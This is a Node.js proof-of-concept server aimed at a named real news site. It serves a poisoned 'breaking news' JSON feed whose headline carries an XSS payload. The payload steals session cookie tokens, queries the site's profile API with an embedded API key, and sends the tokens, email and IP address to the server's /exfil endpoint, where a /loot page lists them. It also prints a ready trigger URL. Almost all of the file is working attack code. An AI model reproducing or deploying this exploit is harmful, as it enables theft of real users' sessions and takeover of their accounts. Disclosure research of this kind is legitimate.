/**
 * Fox Business DOM XSS → Account Takeover PoC Server
 * Serves the Spark API payload that triggers XSS via breaking-news.js,
 * then steals NATSSO cookie tokens and demonstrates full ATO.
 */

const http = require('http');
const fs = require('fs');
const path = require('path');
const { URL } = require('url');

const PORT = process.env.PORT || 3000;
const PUBLIC_DIR = path.join(__dirname, 'public');
const SELF = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;

// In-memory store for exfiltrated data (PoC only — latest 50 entries)
const loot = [];

// The XSS JS payload that runs in www.foxbusiness.com context.
// 1. Reads NATSSO cookie (.foxbusiness.com domain, no HttpOnly)
// 2. Parses accessToken, refreshToken, profileId
// 3. Calls api3.fox.com to read victim profile (CORS: *)
// 4. Sends everything to our /exfil endpoint
function buildXSSPayload(server) {
  return `(async()=>{` +
    `try{` +
      // Read NATSSO cookie
      `var m=document.cookie.match(/NATSSO=([^;]+)/);` +
      `if(!m){new Image().src='${server}/exfil?err=no_natsso';return}` +
      `var t=JSON.parse(decodeURIComponent(m[1]));` +
      // Call Fox API with stolen token
      `var r=await fetch('https://api3.fox.com/v2.0/update/'+t.profileId,{` +
        `headers:{'Authorization':'Bearer '+t.accessToken,` +
        `'x-api-key':'4DfS6SQQBOoc2xImxylIam2ri8TXdHQV'}` +
      `});` +
      `var d=await r.json();` +
      // Exfiltrate tokens + profile to attacker
      `var p={` +
        `accessToken:t.accessToken,` +
        `refreshToken:t.refreshToken,` +
        `profileId:t.profileId,` +
        `email:d.email,` +
        `displayName:d.displayName,` +
        `firstName:d.firstName,` +
        `viewerId:d.viewerId,` +
        `ipAddress:d.ipAddress,` +
        `domain:document.domain` +
      `};` +
      `await fetch('${server}/exfil',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)});` +
      // Show proof to researcher
      `document.title='ATO: '+d.email;` +
      `var b=document.createElement('div');` +
      `b.style.cssText='position:fixed;top:0;left:0;right:0;z-index:999999;background:#d32f2f;color:#fff;padding:16px;font:bold 16px system-ui;text-align:center;';` +
      `b.innerHTML='Account Takeover PoC — Stolen: '+d.email+' ('+t.profileId+')';` +
      `document.body.prepend(b);` +
    `}catch(e){new Image().src='${server}/exfil?err='+encodeURIComponent(e.message)}` +
  `})()`;
}

// Build the Spark API JSON that breaking-news.js expects
function buildPayload(server) {
  const js = buildXSSPayload(server);
  return {
    data: {
      status: { success: true, code: 200 },
      existing_total: 1,
      results: [{
        publication_date: new Date().toISOString(),
        eyebrow: '',
        'main-content': [{
          component: 'BreakingNews',
          model: {
            url: 'https://www.foxbusiness.com/markets',
            headline: `<img src=x onerror="${js.replace(/"/g, '&quot;')}">`,
            bannerType: 'BreakingNews'
          }
        }]
      }]
    }
  };
}

const server = http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  const urlPath = req.url.split('?')[0];

  // ── Exfiltration endpoint ──────────────────────────────────────────
  if (urlPath === '/exfil') {
    if (req.method === 'POST') {
      let body = '';
      req.on('data', c => body += c);
      req.on('end', () => {
        try {
          const data = JSON.parse(body);
          data._ts = new Date().toISOString();
          data._ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
          loot.push(data);
          if (loot.length > 50) loot.shift();
          console.log(`[LOOT] ${data.email || 'unknown'} — ${data.profileId || '?'}`);
        } catch(e) {}
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end('{"ok":true}');
      });
      return;
    }
    // GET /exfil?err=... — error beacon
    const qs = new URL(req.url, 'http://x').searchParams;
    if (qs.has('err')) console.log(`[ERR] ${qs.get('err')}`);
    res.writeHead(200, { 'Content-Type': 'image/gif' });
    res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
    return;
  }

  // ── View stolen data ───────────────────────────────────────────────
  if (urlPath === '/loot') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(loot, null, 2));
    return;
  }

  // ── XSS + ATO payload (Spark API format) ───────────────────────────
  if (urlPath === '/' || urlPath === '/payload.json' || urlPath === '/vercel.json' || urlPath === '/breaking.json') {
    const payload = buildPayload(SELF);
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Cache-Control', 'no-cache, no-store');
    res.writeHead(200);
    res.end(JSON.stringify(payload));
    return;
  }

  // ── Simple alert-only payload (for quick demo) ─────────────────────
  if (urlPath === '/alert') {
    const simple = {
      data: {
        status: { success: true, code: 200 },
        existing_total: 1,
        results: [{
          publication_date: new Date().toISOString(),
          'main-content': [{
            component: 'BreakingNews',
            model: {
              url: 'https://www.foxbusiness.com/',
              headline: '<img src=x onerror=alert(document.domain)>',
              bannerType: 'BreakingNews'
            }
          }]
        }]
      }
    };
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Cache-Control', 'no-cache, no-store');
    res.writeHead(200);
    res.end(JSON.stringify(simple));
    return;
  }

  // ── Static files from public/ ──────────────────────────────────────
  const safePath = path.normalize(req.url.split('?')[0]).replace(/^(\.\.(\/|\\|$))+/, '');
  const filePath = path.join(PUBLIC_DIR, safePath);
  if (!filePath.startsWith(PUBLIC_DIR)) {
    res.writeHead(403);
    res.end();
    return;
  }
  fs.readFile(filePath, (err, data) => {
    if (err) { res.writeHead(404); res.end(); return; }
    const ext = path.extname(filePath);
    const types = { '.html': 'text/html', '.json': 'application/json', '.js': 'application/javascript' };
    res.setHeader('Content-Type', types[ext] || 'application/octet-stream');
    res.writeHead(200);
    res.end(data);
  });
});

server.listen(PORT, () => {
  console.log(`\n  ATO payload server on ${SELF}`);
  console.log(`  ──────────────────────────────────────────────`);
  console.log(`  ATO payload:   /vercel.json  (or / /payload.json)`);
  console.log(`  Alert-only:    /alert`);
  console.log(`  Stolen data:   /loot`);
  console.log(`  Exfil beacon:  /exfil`);
  console.log(`  PostMessage:   /foxbusiness-postmessage-poc.html`);
  console.log(`\n  Trigger URL:`);
  console.log(`  https://www.foxbusiness.com/?_breaking_feed_url=${SELF}/vercel.json\n`);
});
